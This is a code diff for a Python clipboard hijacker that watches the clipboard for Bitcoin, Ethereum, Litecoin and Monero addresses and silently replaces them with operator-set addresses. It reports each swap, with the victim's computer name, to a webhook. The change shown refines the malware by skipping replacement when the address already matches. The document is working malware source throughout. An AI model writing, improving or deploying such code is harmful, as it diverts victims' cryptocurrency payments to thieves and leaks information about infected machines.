@@ -51,117 +51,121 @@ def is_crypto_addr(clipboard_text):
 def main():
     while True:
         try:
-            clipboard = pyperclip.paste()
-            var = is_crypto_addr(clipboard)
+            clipboard_text = pyperclip.paste()
+            var = is_crypto_addr(clipboard_text)
 
             if var == "BTC":
                 if btcaddr != "SET BTC ADDRESS HERE":
-                    pyperclip.copy(btcaddr)
-                    if single_use:
-                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                o.write("True")
-                                o.close()
-                            sys.exit()
-                    if webhook_url != "":
-                            if ping:
-                                message = {
-                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
-                                }
-                            else:
-                                message = {
-                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
-                                }
+                    if clipboard_text != btcaddr:
+                        pyperclip.copy(btcaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                    }
 
-                            json_data = json.dumps(message)
+                                json_data = json.dumps(message)
 
-                            conn = http.client.HTTPSConnection(host)
-                            conn.request("POST", url_path, json_data, headers)
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
 
-                            response = conn.getresponse()
+                                response = conn.getresponse()
 
-                            response.read()
-                            conn.close()
+                                response.read()
+                                conn.close()
             elif var == "ETH":
                 if ethaddr != "SET ETH ADDRESS HERE":
-                    pyperclip.copy(ethaddr)
-                    if single_use:
-                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                o.write("True")
-                                o.close()
-                            sys.exit()
-                    if webhook_url != "":
-                            if ping:
-                                message = {
-                                "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
-                                }
-                            else:
-                                message = {
-                                    "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
-                                }
+                    if clipboard_text != ethaddr:
+                        pyperclip.copy(ethaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
+                                    }
 
-                            json_data = json.dumps(message)
+                                json_data = json.dumps(message)
 
-                            conn = http.client.HTTPSConnection(host)
-                            conn.request("POST", url_path, json_data, headers)
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
 
-                            response = conn.getresponse()
+                                response = conn.getresponse()
 
-                            response.read()
-                            conn.close()
+                                response.read()
+                                conn.close()
             elif var == "LTC":
                 if ltcaddr != "SET LTC ADDRESS HERE":
-                    pyperclip.copy(ltcaddr)
-                    if single_use:
-                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                o.write("True")
-                                o.close()
-                            sys.exit()
-                    if webhook_url != "":
-                            if ping:
-                                message = {
-                                "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
-                                }
-                            else:
-                                message = {
-                                    "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
-                                }
+                    if clipboard_text != ltcaddr:
+                        pyperclip.copy(ltcaddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                    }
 
-                            json_data = json.dumps(message)
+                                json_data = json.dumps(message)
 
-                            conn = http.client.HTTPSConnection(host)
-                            conn.request("POST", url_path, json_data, headers)
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
 
-                            response = conn.getresponse()
+                                response = conn.getresponse()
 
-                            response.read()
-                            conn.close()
+                                response.read()
+                                conn.close()
             elif var == "XMR":
                 if xmraddr != "SET XMR ADDRESS HERE":
-                    pyperclip.copy(xmraddr)
-                    if single_use:
-                            with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
-                                o.write("True")
-                                o.close()
-                            sys.exit()
-                    if webhook_url != "":
-                            if ping:
-                                message = {
-                                "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
-                                }
-                            else:
-                                message = {
-                                    "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
-                                }
+                    if clipboard_text != xmraddr:
+                        pyperclip.copy(xmraddr)
+                        if single_use:
+                                with open(os.path.join(os.environ['APPDATA'], 'Storage0', 'storage.txt'), "w") as o:
+                                    o.write("True")
+                                    o.close()
+                                sys.exit()
+                        if webhook_url != "":
+                                if ping:
+                                    message = {
+                                    "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                    }
+                                else:
+                                    message = {
+                                        "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                    }
 
-                            json_data = json.dumps(message)
+                                json_data = json.dumps(message)
 
-                            conn = http.client.HTTPSConnection(host)
-                            conn.request("POST", url_path, json_data, headers)
+                                conn = http.client.HTTPSConnection(host)
+                                conn.request("POST", url_path, json_data, headers)
 
-                            response = conn.getresponse()
+                                response = conn.getresponse()
 
-                            response.read()
-                            conn.close()
+                                response.read()
+                                conn.close()
             else:
                 pass
         except Exception:
